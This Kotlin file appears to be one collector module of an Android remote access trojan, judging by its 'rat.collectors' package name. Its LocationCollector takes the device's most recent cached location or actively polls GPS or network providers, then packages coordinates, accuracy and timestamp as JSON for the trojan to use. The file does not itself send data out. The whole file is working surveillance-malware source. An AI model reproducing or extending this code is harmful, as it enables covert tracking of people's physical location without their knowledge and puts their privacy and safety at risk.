package com.example.rat.collectors

import android.content.Context
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.os.Looper
import org.json.JSONObject
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

object LocationCollector {

    fun get(context: Context): JSONObject {
        val manager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager

        var best: Location? = null
        for (provider in manager.getProviders(true)) {
            val candidate = manager.getLastKnownLocation(provider) ?: continue
            if (best == null || candidate.time > best!!.time) best = candidate
        }

        if (best == null) {
            val latch = CountDownLatch(1)
            val listener = object : LocationListener {
                override fun onLocationChanged(location: Location) {
                    best = location
                    latch.countDown()
                }
                @Deprecated("Deprecated in Java")
                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
            }

            val provider = when {
                manager.isProviderEnabled(LocationManager.GPS_PROVIDER) -> LocationManager.GPS_PROVIDER
                manager.isProviderEnabled(LocationManager.NETWORK_PROVIDER) -> LocationManager.NETWORK_PROVIDER
                else -> null
            }

            if (provider != null) {
                try {
                    manager.requestLocationUpdates(provider, 0L, 0f, listener, Looper.getMainLooper())
                    latch.await(15, TimeUnit.SECONDS)
                } catch (_: Exception) {
                } finally {
                    try { manager.removeUpdates(listener) } catch (_: Exception) {}
                }
            }
        }

        val fix = best
        return JSONObject().apply {
            if (fix != null) {
                put("lat", fix.latitude)
                put("lon", fix.longitude)
                put("accuracy", fix.accuracy.toDouble())
                put("provider", fix.provider ?: "")
                put("time", fix.time)
            } else {
                put("error", "no location fix")
            }
        }
    }
}
